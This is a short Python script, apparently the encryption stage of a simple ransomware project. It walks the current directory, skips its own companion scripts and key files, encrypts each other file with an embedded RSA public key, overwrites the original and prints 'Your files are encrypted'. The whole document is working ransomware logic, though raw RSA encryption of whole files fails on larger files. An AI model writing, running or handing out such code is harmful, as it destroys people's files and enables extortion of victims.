import os
import rsa


public_key_pem = """
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAgcoWsUdseU21eqiUDDuv3yReCOwyaX5F95nEr0dBqgbnV3wAUdCB
8FopjKtopEGVUR412i+s2O+hp5ZTPfo9XxJB8hj2IIIhyxHNcrPdxGTbNQSkxkDB
d5q55kI+SoYDoyG7/QUZBuDvCvSCm01NC+r2guT8fpMqQCeu0S++l3QA0FFD8mdb
AM0mBkkgtU4wh84rvqTik2rJuJqXh7fEbNXS1d+LiVXwBrm7LxKR1WuOpXCjoB6I
126d34iud2cBOOUlOGK1DnIIUeKBVjc6XXYtZz+JWjoiobaETBpA94i8W3htDL/W
btJqj6xc3SZpaGhFJiEnfaCSGZmWGEwufQIDAQAB
-----END RSA PUBLIC KEY-----"""

files = [] 
for file in os.listdir():
    if file == "ransom_fixer.py" or file == "decrypter.py" or file == "encrypter.py" or file == "key_generator.py" or file == "private.pem" or file == "public.pem" or file == "ransom.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

for file in files:
    public_key = rsa.PublicKey.load_pkcs1(public_key_pem.encode())

    with open(file, 'rb') as f:
        data = f.read()


    encrytped_data = rsa.encrypt(data, public_key)


    with open(file, 'wb') as f:
         f.write(encrytped_data)

print("Your files are encrypted")
